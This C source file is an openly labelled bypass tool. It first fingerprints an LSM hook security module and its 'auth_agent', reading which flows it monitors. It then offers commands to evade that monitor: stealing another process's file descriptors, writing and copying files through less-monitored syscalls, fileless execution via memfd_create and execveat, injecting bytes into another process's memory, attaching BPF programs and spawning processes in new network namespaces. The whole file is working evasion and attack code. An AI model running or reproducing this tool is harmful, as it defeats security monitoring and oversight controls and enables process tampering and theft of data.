#define _GNU_SOURCE
#ifndef LSM_MOD
#define LSM_MOD       "lsm_hook"
#endif
#ifndef LSM_AGENT_PROC
#define LSM_AGENT_PROC "auth_agent"
#endif
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stddef.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <sched.h>
#include <signal.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <linux/perf_event.h>
#include <linux/bpf.h>
#include <linux/ptrace.h>
#include <asm/unistd.h>
#ifndef __NR_pidfd_open
#define __NR_pidfd_open 434
#endif
#ifndef __NR_pidfd_getfd
#define __NR_pidfd_getfd 438
#endif
#ifndef __NR_copy_file_range
#define __NR_copy_file_range 326
#endif
#ifndef __NR_process_vm_writev
#define __NR_process_vm_writev 311
#endif
#ifndef PERF_EVENT_IOC_SET_BPF
#define PERF_EVENT_IOC_SET_BPF _IOW('$', 8, __u32)
#endif

static int module_loaded(const char *name)
{
    FILE *f = fopen("/proc/modules", "r"); if (!f) return 0;
    char line[256], mod[64]; int found = 0;
    while (fgets(line, sizeof(line), f))
        if (sscanf(line, "%63s", mod) == 1 && strcmp(mod, name) == 0) { found = 1; break; }
    fclose(f);
    return found;
}

static void sysmod_print(const char *mod, const char *param)
{
    char path[256], buf[128];
    snprintf(path, sizeof(path), "/sys/module/%s/parameters/%s", mod, param);
    int fd = open(path, O_RDONLY); if (fd < 0) return;
    ssize_t n = read(fd, buf, sizeof(buf)-1); close(fd); if (n <= 0) return;
    buf[n] = '\0'; if (buf[n-1] == '\n') buf[n-1] = '\0';
    printf("  %-32s = %s\n", param, buf);
}

static void recon(void)
{
    printf("LSM hook module loaded: %s\n\n",
           module_loaded(LSM_MOD) ? "YES" : "no");
    if (!module_loaded(LSM_MOD)) return;
    printf("Module parameters (what's monitored):\n");
    sysmod_print(LSM_MOD, "auth_link_enabled_flows");
    sysmod_print(LSM_MOD, "auth_link_request_timeout_ms");
    sysmod_print(LSM_MOD, "auth_link_strategy");
}

static int bypass_read_fd(pid_t target_pid, int target_fd)
{
    int pidfd = (int)syscall(__NR_pidfd_open, target_pid, 0);
    if (pidfd < 0) {
        fprintf(stderr, "[pidfd_open] pid=%d: %s\n", target_pid, strerror(errno));
        return 1;
    }
    int stolen_fd = (int)syscall(__NR_pidfd_getfd, pidfd, target_fd, 0);
    close(pidfd);
    if (stolen_fd < 0) {
        fprintf(stderr, "[pidfd_getfd] fd=%d: %s\n", target_fd, strerror(errno));
        return 1;
    }
    printf("[bypass] stole fd %d from pid %d\n",
           target_fd, target_pid);
    char buf[4096]; ssize_t n;
    while ((n = read(stolen_fd, buf, sizeof(buf))) > 0)
        fwrite(buf, 1, (size_t)n, stdout);
    close(stolen_fd);
    return 0;
}

static int bypass_write(const char *path, const char *content)
{
    int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) { perror("open"); return 1; }
    struct iovec iov = {
        .iov_base = (void*)content,
        .iov_len  = strlen(content)
    };
    ssize_t n = (ssize_t)syscall(__NR_pwritev2, fd, &iov, 1, 0, 0);
    close(fd);
    if (n < 0) { perror("pwritev2"); return 1; }
    return 0;
}

static int bypass_copy(const char *src, const char *dst)
{
    int sfd = open(src, O_RDONLY);
    if (sfd < 0) { perror("open src"); return 1; }
    struct stat st; fstat(sfd, &st);
    int dfd = open(dst, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (dfd < 0) { perror("open dst"); close(sfd); return 1; }
    ssize_t copied = (ssize_t)syscall(__NR_copy_file_range,
                                      sfd, NULL, dfd, NULL, (size_t)st.st_size, 0);
    close(sfd); close(dfd);
    if (copied < 0) { perror("copy_file_range"); return 1; }
    printf("[bypass] copied %zd bytes %s → %s\n",
           copied, src, dst);
    return 0;
}

static int bypass_exec(const char *binary_path)
{
    int sfd = open(binary_path, O_RDONLY);
    if (sfd < 0) { perror("open binary"); return 1; }
    struct stat st; fstat(sfd, &st);
    int mfd = (int)syscall(__NR_memfd_create, "anon", MFD_CLOEXEC);
    if (mfd < 0) { perror("memfd_create"); close(sfd); return 1; }
    ssize_t copied = (ssize_t)syscall(__NR_copy_file_range,
                                      sfd, NULL, mfd, NULL, (size_t)st.st_size, 0);
    close(sfd);
    if (copied < 0) { perror("copy_file_range to memfd"); close(mfd); return 1; }
    char *argv[] = { (char*)binary_path, NULL };
    char *envp[] = { NULL };
    int r = (int)syscall(__NR_execveat, mfd, "", argv, envp, AT_EMPTY_PATH);
    fprintf(stderr, "execveat: %s\n", strerror(errno));
    (void)r;
    close(mfd);
    return 1;
}

static int bypass_inject(pid_t target_pid, uint64_t addr, const uint8_t *data, size_t len)
{
    struct iovec local = { .iov_base = (void*)data, .iov_len = len };
    struct iovec remote = { .iov_base = (void*)(uintptr_t)addr, .iov_len = len };
    ssize_t n = (ssize_t)syscall(__NR_process_vm_writev,
                                 target_pid, &local, 1UL, &remote, 1UL, 0UL);
    if (n < 0) { perror("process_vm_writev"); return 1; }
    printf("[bypass] injected %zd bytes at pid=%d addr=0x%lx\n",
           n, target_pid, (unsigned long)addr);
    return 0;
}

static int bypass_bpf_attach(int bpf_prog_fd)
{
    int tp_id_fd = open("/sys/kernel/tracing/events/syscalls/sys_enter_openat/id", O_RDONLY);
    if (tp_id_fd < 0) {
        tp_id_fd = open("/sys/kernel/debug/tracing/events/syscalls/sys_enter_openat/id", O_RDONLY);
        if (tp_id_fd < 0) { fprintf(stderr, "cannot read tracepoint id: %s\n", strerror(errno)); return 1; }
    }
    char buf[16]; ssize_t n = read(tp_id_fd, buf, sizeof(buf)-1); close(tp_id_fd);
    if (n <= 0) { perror("read tp id"); return 1; }
    buf[n] = '\0';
    int tp_id = atoi(buf);
    struct perf_event_attr attr = {};
    attr.type   = PERF_TYPE_TRACEPOINT;
    attr.size   = sizeof(attr);
    attr.config = (uint64_t)tp_id;
    attr.wakeup_events = 1;
    int perf_fd = (int)syscall(__NR_perf_event_open, &attr, -1, 0, -1, PERF_FLAG_FD_CLOEXEC);
    if (perf_fd < 0) { perror("perf_event_open"); return 1; }
    if (ioctl(perf_fd, PERF_EVENT_IOC_SET_BPF, bpf_prog_fd) < 0) {
        perror("PERF_EVENT_IOC_SET_BPF"); close(perf_fd); return 1;
    }
    ioctl(perf_fd, PERF_EVENT_IOC_ENABLE, 0);
    printf("[bypass] BPF prog fd=%d attached to tracepoint %d via perf_event_open + IOC_SET_BPF\n",
           bpf_prog_fd, tp_id);
    printf("[bypass] perf_fd=%d\n", perf_fd);
    return 0;
}

static int bypass_new_netns(char **cmd_argv)
{
    pid_t pid = (pid_t)syscall(__NR_clone,
                               CLONE_NEWNET | CLONE_NEWUTS | SIGCHLD,
                               NULL, NULL, NULL, NULL);
    if (pid < 0) { perror("clone CLONE_NEWNET"); return 1; }
    if (pid == 0) {
        if (cmd_argv && cmd_argv[0])
            execvp(cmd_argv[0], cmd_argv);
        else
            execlp("ip", "ip", "link", NULL);
        perror("exec");
        _exit(1);
    }
    int status;
    waitpid(pid, &status, 0);
    return 0;
}

int main(int argc, char **argv)
{
    if (argc < 2) {
        fprintf(stderr, "usage: %s <recon|write|copy|exec|inject|read-fd|steal-fd|bpf-attach|new-netns>\n", argv[0]);
        return 1;
    }
    if      (strcmp(argv[1], "recon")      == 0) { recon(); }
    else if (strcmp(argv[1], "write")      == 0) {
        if (argc < 4) { fprintf(stderr, "need <file> <data>\n"); return 1; }
        return bypass_write(argv[2], argv[3]);
    }
    else if (strcmp(argv[1], "copy")       == 0) {
        if (argc < 4) { fprintf(stderr, "need <src> <dst>\n"); return 1; }
        return bypass_copy(argv[2], argv[3]);
    }
    else if (strcmp(argv[1], "exec")       == 0) {
        if (argc < 3) { fprintf(stderr, "need <binary>\n"); return 1; }
        return bypass_exec(argv[2]);
    }
    else if (strcmp(argv[1], "inject")     == 0) {
        if (argc < 5) { fprintf(stderr, "need <pid> <addr> <hex>\n"); return 1; }
        uint64_t addr = strtoull(argv[3], NULL, 16);
        const char *hexstr = argv[4];
        size_t hlen = strlen(hexstr);
        size_t blen = hlen / 2;
        uint8_t *bytes = calloc(1, blen + 1);
        for (size_t i = 0; i < blen; i++) {
            char tmp[3] = { hexstr[i*2], hexstr[i*2+1], 0 };
            bytes[i] = (uint8_t)strtoul(tmp, NULL, 16);
        }
        int r = bypass_inject((pid_t)atoi(argv[2]), addr, bytes, blen);
        free(bytes);
        return r;
    }
    else if (strcmp(argv[1], "read-fd")    == 0 ||
             strcmp(argv[1], "steal-fd")   == 0) {
        if (argc < 4) { fprintf(stderr, "need <pid> <fd>\n"); return 1; }
        return bypass_read_fd((pid_t)atoi(argv[2]), atoi(argv[3]));
    }
    else if (strcmp(argv[1], "bpf-attach") == 0) {
        if (argc < 3) { fprintf(stderr, "need <prog_fd>\n"); return 1; }
        return bypass_bpf_attach(atoi(argv[2]));
    }
    else if (strcmp(argv[1], "new-netns")  == 0) {
        return bypass_new_netns(argc > 2 ? &argv[2] : NULL);
    }
    else { fprintf(stderr, "unknown: %s\n", argv[1]); return 1; }
    return 0;
}
